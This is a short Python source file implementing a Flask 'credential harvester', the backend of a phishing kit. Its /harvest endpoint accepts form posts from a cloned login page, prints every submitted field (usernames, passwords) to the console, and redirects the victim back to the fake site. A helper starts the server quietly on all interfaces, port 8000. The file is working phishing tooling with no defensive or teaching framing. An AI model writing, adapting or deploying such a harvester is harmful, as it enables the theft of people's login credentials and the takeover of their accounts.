import logging
import threading
from flask import Flask, request, redirect

app = Flask(__name__)

# Disable Flask's default logging to keep the console clean
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/harvest', methods=['POST'])
def harvest():
    """
    Receives and logs credentials from a phishing page.
    """
    print("\n--- Credentials Captured ---")
    for key, value in request.form.items():
        print(f"  {key}: {value}")
    print("--------------------------")

    # After capturing, redirect the user back to the cloned site's index.
    # A more advanced version might redirect to the original site.
    return redirect("index.html")

def run_harvester_server():
    """
    Runs the Flask credential harvester server in a separate thread.
    """
    server_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8000))
    server_thread.daemon = True
    server_thread.start()
    logging.info("Credential harvester server started on port 8000.")
    print("Credential harvester server listening on http://0.0.0.0:8000")
